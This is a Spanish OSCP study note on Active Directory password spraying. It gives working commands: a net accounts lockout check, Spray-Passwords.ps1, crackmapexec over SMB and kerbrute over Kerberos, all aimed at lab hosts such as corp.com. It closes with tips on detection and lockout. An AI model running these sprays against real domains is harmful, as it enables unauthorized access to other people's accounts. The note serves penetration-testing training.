---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, ad, explotacion, windows, linux]
---

# AD Password Spraying

> [!abstract] Qué es y cuándo usarla
> Probar **1 password** (o pocas) contra **muchos** usuarios del dominio para encontrar credenciales válidas sin bloquear cuentas. Útil tras enumerar usuarios (módulo 22) y conocer un password probable (política, leaks, shares).

## Requisitos previos
- Lista de usuarios del dominio.
- Conocer la **política de lockout** para no bloquear cuentas.

## Pasos
```powershell
net accounts        # Lockout threshold / observation window ANTES de spray
```
```powershell
# 1) LDAP/ADSI low & slow (Spray-Passwords.ps1 en CLIENT75)
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
```bash
# 2) SMB con crackmapexec (ruidoso; marca (Pwn3d!) si el user es admin local)
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
```powershell
# 3) Kerberos AS-REQ con kerbrute (rapido, 2 frames UDP)
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
Validar DirectoryEntry puntualmente (PowerShell): `New-Object System.DirectoryServices.DirectoryEntry($ldap,"user","pass")` crea el objeto solo si el password es correcto.

> [!warning] Detección / problemas
> - **crackmapexec no mira la política** de lockout → cuidado con bloquear cuentas.
> - kerbrute: `usernames.txt` en **ANSI** (si no, error de red).
> - SMB spraying es **ruidoso** (una conexión SMB completa por intento).
> - `(Pwn3d!)` en crackmapexec = admin local en ese host.

## Visto en
- Módulo: [[23 - Attacking Active Directory Authentication]]
- Máquinas: [[]]
